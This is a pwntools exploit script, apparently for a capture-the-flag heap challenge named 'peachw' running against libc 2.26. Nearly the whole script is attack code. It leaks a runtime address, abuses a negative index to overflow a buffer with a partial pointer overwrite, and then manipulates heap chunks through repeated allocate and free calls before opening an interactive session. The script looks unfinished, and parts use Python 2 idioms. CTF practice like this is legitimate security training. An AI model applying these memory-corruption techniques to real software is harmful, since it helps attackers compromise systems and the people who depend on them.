from pwn import *
import time
context(log_level='debug',arch='amd64')

binary_name='peachw'

libc=ELF("./libc/libc-2.26.so")
e=ELF("./"+binary_name)

p=process("./peachw")

ru=lambda x:p.recvuntil(x)
rc=lambda x:p.recv(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sla=lambda a,b:p.sendlineafter(a,b)
sa=lambda a,b:p.sendafter(a,b)
it=lambda : p.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))

def cho(num):
	ru('Your choice:')
	sd(p32(num)+b'\x00')
	
def add(idx, sz, name, des):
	cho(1)
	sla('Index ?',str(idx))
	sla('please name your peach  : \n',name)
	sla('size of your peach:', str(sz))
	ru('descripe your peach :')
	sd(des)
	
def add2(idx, name):
	cho(1)
	sla('Index ?',str(idx))
	sla('please name your peach  : \n',name)
	sla('size of your peach:', str(0x80))
	
def delete(idx):
	cho(2)
	sla('Index ?',str(idx))
	
def eat(idx, num):
	cho(3)
	sla('Index ?',str(idx))
	ru('lucky number?')
	sd(p32(num)+b'\x00')
	
def draw(idx, sz, data):
	cho(4)
	sla('Index ?',str(idx))
	ru('size of your peach : ')
	sd(p32(sz)+b'\x00')
	ru('your peach')
	sd(data)


# attach(p)
sla('Do you like peach?','yes\x00'.ljust(0x1c,'a'))
ru('The peach is ')
addr = int(ru('\n')[:-1])-0x60
lg("addr")


payload='a'*0x198+p16(addr)
# pause()
draw(-0x24,0x420, payload)
# pause()

add(1,0x420,'Epipany','Epipany1'*(0x100/8))

delete(1)
add2(0,'a')

delete(0)
it()